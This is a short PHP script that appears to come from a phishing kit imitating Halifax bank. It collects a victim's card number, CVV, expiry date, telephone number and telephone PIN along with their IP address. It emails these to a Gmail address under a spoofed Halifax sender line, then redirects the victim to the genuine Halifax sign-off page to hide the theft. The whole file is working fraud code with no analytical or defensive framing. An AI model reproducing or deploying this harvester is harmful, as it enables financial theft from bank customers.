<?php
$token=$_SESSION['token'];
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$httprefi = getenv ("HTTP_REFERER");
$server=$_SERVER["HTTP_HOST"];
$browser = $_SERVER['HTTP_USER_AGENT'];
$tel=$_POST['tel'];
$tpin=$_POST['tpin'];
$card=$_POST['card'];
$cvv=$_POST['cvv'];
$cc=$_POST['cc'];
$month=$_POST['month'];
$year=$_POST['year'];
$mesaj="
$adddate
Telephone Number: $tel
Card: $card$cc
Exp Date: $month / $year
Cvv: $cvv
Tpin: $tpin

$token
ip: $ip";
$send="kingsama786@gmail.com"; 
$subject = "$ip";
$headers = "From: Halifax<xpp@h4l1f4x.com>";
mail($send,$subject,$mesaj,$headers);
header("Location: https://www.halifax-online.co.uk/_mem_bin/SignOff.asp");
session_end();
?>